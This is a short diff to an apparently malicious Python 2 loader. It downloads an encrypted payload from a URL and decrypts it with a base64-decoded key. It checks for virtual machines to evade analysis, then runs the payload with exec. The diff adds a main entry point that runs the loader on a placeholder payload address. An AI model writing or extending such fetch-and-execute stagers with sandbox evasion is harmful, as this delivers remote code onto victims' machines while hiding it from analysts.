@@ -91,9 +91,9 @@ def main(*args, **kwargs):
             
     if 'payload' in kwargs:
         debug("Decrypting payload...")
-        payload = decrypt(urllib.urlopen(kwargs.get('payload')).read(), '__KEY__')
+        payload = decrypt(urllib.urlopen(kwargs.get('payload')).read(), base64.b64decode('__KEY__'))
 
-    if config.get('antiforensics'):
+    if kwargs.get('antiforensics'):
         debug("Checking for virtual machines...")
         if antiforensics():
             debug("Virtual machine detected.")
@@ -103,3 +103,6 @@ def main(*args, **kwargs):
         debug("Running payload...")
         exec payload in globals()
 
+
+if __name__ == '__main__':
+    main(payload='__PAYLOAD__')
